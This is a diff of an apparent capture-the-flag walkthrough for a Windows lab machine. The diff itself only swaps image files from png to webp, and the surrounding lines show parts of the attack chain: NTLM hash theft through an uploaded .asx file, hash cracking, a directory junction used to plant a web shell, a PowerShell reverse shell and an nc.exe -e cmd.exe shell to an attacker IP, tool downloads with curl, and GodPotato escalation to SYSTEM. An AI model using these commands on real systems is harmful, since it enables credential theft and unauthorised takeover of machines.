@@ -51,15 +51,15 @@ Nmap done: 1 IP address (1 host up) scanned in 27.37 seconds
 
 While exploring the site we see our first potential target.
 
-![The upload form on the ProMotion Studio site](/images/media/1.png)
+![The upload form on the ProMotion Studio site](/images/media/1.webp)
 
 We see that we are not limited to sending only videos, but other extensions too. The second thing we notice is that HR is reviewing our video with what we can guess is Windows Media Player.
 
-![Site text mentioning that HR reviews submissions in Windows Media Player](/images/media/2.png)
+![Site text mentioning that HR reviews submissions in Windows Media Player](/images/media/2.webp)
 
 So we do a bit of research and see that we can try to steal an NTLM hash.
 
-![Research on stealing NTLM hashes through media playlist files](/images/media/3.png)
+![Research on stealing NTLM hashes through media playlist files](/images/media/3.webp)
 
 So we create a payload using AI or just search Google for it and save it as `file.asx`. Mine looks like this:
 
@@ -81,7 +81,7 @@ sudo responder -I tun0
 
 And soon enough we get our hash. Also, if you don't get a hash after a couple of seconds, try putting different values in `First name`, `Last name` and `Email` than previously.
 
-![Responder capturing the NTLMv2 hash](/images/media/4.png)
+![Responder capturing the NTLMv2 hash](/images/media/4.webp)
 
 Then we crack the hash:
 
@@ -89,7 +89,7 @@ Then we crack the hash:
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-![John cracking the captured hash](/images/media/5.png)
+![John cracking the captured hash](/images/media/5.webp)
 
 So we SSH in and we get the `user.txt` flag.
 
@@ -170,7 +170,7 @@ There we see this snippet of code:
 
 We can see that the file upload directory is `C:/Windows/Tasks/Uploads/` and the directory names there are `md5` of `firstname + lastname + email`.
 
-![The uploads directory with md5 named folders](/images/media/6.png)
+![The uploads directory with md5 named folders](/images/media/6.webp)
 
 So because we can write to `C:/Windows/Tasks/Uploads/` and can't write to `C:\xampp\htdocs`, we can create a link between these two.
 
@@ -180,19 +180,19 @@ mklink /J C:\Windows\Tasks\Uploads\<YOUR_HASH_HERE> C:\xampp\htdocs
 
 That's how my hash looked using this formula: `firstname + lastname + email`
 
-![Generating the md5 hash from the form values](/images/media/7.png)
+![Generating the md5 hash from the form values](/images/media/7.webp)
 
 We create the link.
 
-![Creating the directory junction with mklink](/images/media/8.png)
+![Creating the directory junction with mklink](/images/media/8.webp)
 
 Now we paste our web shell and fill in the forms.
 
-![Uploading the web shell through the submission form](/images/media/9.png)
+![Uploading the web shell through the submission form](/images/media/9.webp)
 
 Now we get a web shell. Let's get a reverse shell from it for better functionality.
 
-![Command execution through the uploaded web shell](/images/media/10.png)
+![Command execution through the uploaded web shell](/images/media/10.webp)
 
 ```bash
 nc -lvnp 2115
@@ -206,7 +206,7 @@ powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.10.15.202'
 
 Now we see that we are `nt authority\local service`, so let's check our privileges.
 
-![Privileges of the local service account](/images/media/11.png)
+![Privileges of the local service account](/images/media/11.webp)
 
 We see some of them are disabled or not visible, so we can use the `FullPowers.exe` tool to help us out.
 
@@ -240,7 +240,7 @@ curl http://10.10.15.202:8080/GodPotato-NET4.exe --output GodPotato-NET4.exe
 FullPowers.exe -c "nc.exe 10.10.15.202 443 -e cmd.exe" -z
 ```
 
-![FullPowers returning a shell with the full privilege set](/images/media/12.png)
+![FullPowers returning a shell with the full privilege set](/images/media/12.webp)
 
 Now we can see all our privileges, so let's use `GodPotato`.
 
@@ -248,7 +248,7 @@ Now we can see all our privileges, so let's use `GodPotato`.
 GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
 ```
 
-![GodPotato reading root.txt as SYSTEM](/images/media/13.png)
+![GodPotato reading root.txt as SYSTEM](/images/media/13.webp)
 
 And we get `root.txt`
 
